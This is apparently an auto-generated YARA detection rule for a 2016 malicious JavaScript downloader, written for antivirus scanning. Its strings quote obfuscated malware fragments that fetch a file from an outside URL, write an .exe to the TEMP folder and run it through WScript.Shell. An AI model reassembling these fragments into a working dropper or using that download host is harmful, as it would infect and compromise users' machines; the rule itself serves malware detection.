rule sig_20160330_7c4f81ca716085ee28735ffab7e95cb3 {
  meta:
    description = "datamaliciousorder - file 20160330_7c4f81ca716085ee28735ffab7e95cb3.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e5f4411cf494af879d38a493250c4a14462d4a2635231230244673665f6a90c4"

  strings:
    $s1  = "_M1[_A](\"GET\", \"http://mylookalikedoll.com/n2iks\", false);" fullword ascii
    $s2  = "function _QE(_UM, _VX){_ED = _ED * 1; return _UM - _VX;};" fullword ascii
    $s3  = "var _Y1 = function _PA() {return WScript[_M](\"WScript\"+\".Shell\");}(), _ML = 11;" fullword ascii
    $s4  = "if (_M1[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _Y(){return _J + \"\";};" fullword ascii
    $s6  = "function _ER() {return _Y1[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"xoxEqHCNgXQxU.ex\" + \"e\";};" fullword ascii
    $s7  = "function _P() {return ((_SR == true) && (_SR == _Q0)) ? 1 : _ED;};" fullword ascii
    $s8  = "function _W(_JX){_Y1[\"Run\"](_JX, _ED, _ED);};" fullword ascii
    $s9  = "function _Y0(){return _M;};" fullword ascii
    $s10 = "var _P0 = new this[\"Date\"]();" fullword ascii
    $s11 = "function _ZV()" fullword ascii
    $s12 = "function _U(){return 22;};" fullword ascii
    $s13 = "function _UX(_Q) {var _DI = (1, 2, 3, 4, 5, _Q); return _DI;};" fullword ascii
    $s14 = " while (_EE){" fullword ascii
    $s15 = "return _QE(_T, _N);" fullword ascii
    $s16 = "var _Q0 = false;" fullword ascii
    $s17 = "_SR = true; " fullword ascii
    $s18 = "var _VB = false;" fullword ascii
    $s19 = "var _SR = false;" fullword ascii
    $s20 = "_Q0 = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}